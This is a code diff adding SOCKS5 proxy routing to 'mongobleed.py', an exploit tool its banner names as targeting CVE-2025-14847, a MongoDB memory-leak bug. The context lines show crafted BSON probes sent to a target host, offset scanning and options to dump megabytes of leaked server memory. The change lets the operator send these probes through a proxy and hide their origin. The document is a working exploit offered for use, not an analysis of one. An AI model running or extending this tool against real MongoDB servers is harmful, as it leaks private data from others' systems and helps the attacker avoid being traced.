@@ -48,6 +48,47 @@ BASE64_RE = re.compile(r"^[A-Za-z0-9+/]+={0,2}$")
 SIZE_RE = re.compile(r"^\s*(\d+)\s*(kb|mb)?\s*$", re.IGNORECASE)
 _TLS = threading.local()
 
+# ── SOCKS5 proxy support ──
+_SOCKS_CONF = None  # Set by main() if --socks is provided
+
+def _make_socket():
+    """Create a socket, optionally wrapped with SOCKS5 proxy."""
+    if _SOCKS_CONF:
+        try:
+            import socks as _socks
+        except ImportError:
+            raise ImportError(
+                "SOCKS support requires PySocks: pip install pysocks"
+            )
+        s = _socks.socksocket()
+        s.set_proxy(
+            _socks.SOCKS5,
+            _SOCKS_CONF['host'],
+            _SOCKS_CONF['port'],
+            username=_SOCKS_CONF.get('username'),
+            password=_SOCKS_CONF.get('password'),
+        )
+        return s
+    return socket.socket()
+
+def _parse_socks_arg(value):
+    """Parse --socks [user:pass@]host:port into a config dict."""
+    username = password = None
+    s = value
+    if '@' in s:
+        auth, s = s.rsplit('@', 1)
+        if ':' in auth:
+            username, password = auth.split(':', 1)
+        else:
+            username = auth
+    host, port_str = s.rsplit(':', 1)
+    return {
+        'host': host,
+        'port': int(port_str),
+        'username': username,
+        'password': password,
+    }
+
 def _build_payload(doc_len, buffer_size):
     content = b'\x10a\x00\x01\x00\x00\x00'  # int32 a=1
     bson = struct.pack('<i', doc_len) + content
@@ -65,11 +106,11 @@ def send_probe(host, port, doc_len, buffer_size, timeout):
     header = struct.pack('<IIII', 16 + len(payload), 1, 0, 2012)
     
     try:
-        sock = socket.socket()
+        sock = _make_socket()
         sock.settimeout(timeout)
         sock.connect((host, port))
         sock.sendall(header + payload)
-        
+
         response = b''
         while len(response) < 4 or len(response) < struct.unpack('<I', response[:4])[0]:
             chunk = sock.recv(4096)
@@ -85,9 +126,9 @@ def send_probe_with_status(host, port, doc_len, buffer_size, timeout):
     """Send probe and return (response, ok) for auto-tuning diagnostics."""
     payload = _build_payload(doc_len, buffer_size)
     header = struct.pack('<IIII', 16 + len(payload), 1, 0, 2012)
-    
+
     try:
-        sock = socket.socket()
+        sock = _make_socket()
         sock.settimeout(timeout)
         sock.connect((host, port))
         sock.sendall(header + payload)
@@ -111,7 +152,7 @@ def _get_thread_socket(host, port, timeout):
                 sock.close()
             except:
                 pass
-        sock = socket.socket()
+        sock = _make_socket()
         sock.settimeout(timeout)
         sock.connect((host, port))
         _TLS.sock = sock
@@ -225,7 +266,7 @@ def check_compression_support(host, port, timeout=5):
     }
 
     try:
-        sock = socket.socket()
+        sock = _make_socket()
         sock.settimeout(timeout)
         sock.connect((host, port))
         sock.sendall(header + op_msg)
@@ -315,6 +356,8 @@ def main():
         "  python3 mongobleed.py --host <target> --dump 10MB --dump-window 2048\n"
         "  python3 mongobleed.py --host <target> --dump 512KB --preview-bytes 4096 --decode\n"
         "  python3 mongobleed.py --host <target> --min-offset 100 --max-offset 20000\n"
+        "  python3 mongobleed.py --host <target> --socks 127.0.0.1:1080\n"
+        "  python3 mongobleed.py --host <target> --socks user:pass@proxy:1080 --loop\n"
         "\nDefaults (when only --loop/--decode are set):\n"
         "  --host localhost\n"
         "  --port 27017\n"
@@ -370,7 +413,22 @@ def main():
     parser.add_argument('--output', default=None, help='Output file (default: auto-generated)')
     parser.add_argument('--skip-compression-check', action='store_true',
                         help='Skip the compression support preflight check')
+    parser.add_argument('--socks', default=None, metavar='[USER:PASS@]HOST:PORT',
+                        help='SOCKS5 proxy (e.g., 127.0.0.1:1080 or user:pass@proxy:1080)')
     args = parser.parse_args()
+
+    # Configure SOCKS proxy if specified
+    global _SOCKS_CONF
+    if args.socks:
+        try:
+            _SOCKS_CONF = _parse_socks_arg(args.socks)
+            import socks as _socks_test  # noqa: F401 — verify pysocks installed
+        except ImportError:
+            print("Error: --socks requires PySocks: pip install pysocks", file=sys.stderr)
+            return
+        except Exception as e:
+            print(f"Error: invalid --socks value: {e}", file=sys.stderr)
+            return
 
     console = Console()
 
@@ -1301,6 +1359,11 @@ def main():
     console.print("[bold cyan][*][/bold cyan] mongobleed - CVE-2025-14847 MongoDB Memory Leak")
     console.print("[bold cyan][*][/bold cyan] Author: Joe Desimone - x.com/dez_")
     console.print(f"[bold cyan][*][/bold cyan] Target: {args.host}:{args.port}")
+    if _SOCKS_CONF:
+        socks_display = f"{_SOCKS_CONF['host']}:{_SOCKS_CONF['port']}"
+        if _SOCKS_CONF.get('username'):
+            socks_display = f"{_SOCKS_CONF['username']}:***@{socks_display}"
+        console.print(f"[bold cyan][*][/bold cyan] SOCKS5: {socks_display}")
     console.print(f"[bold cyan][*][/bold cyan] Scanning offsets {args.min_offset}-{args.max_offset}")
     console.print(f"[bold cyan][*][/bold cyan] Workers: {args.workers}")
     console.print(f"[bold cyan][*][/bold cyan] Output: {args.output}")
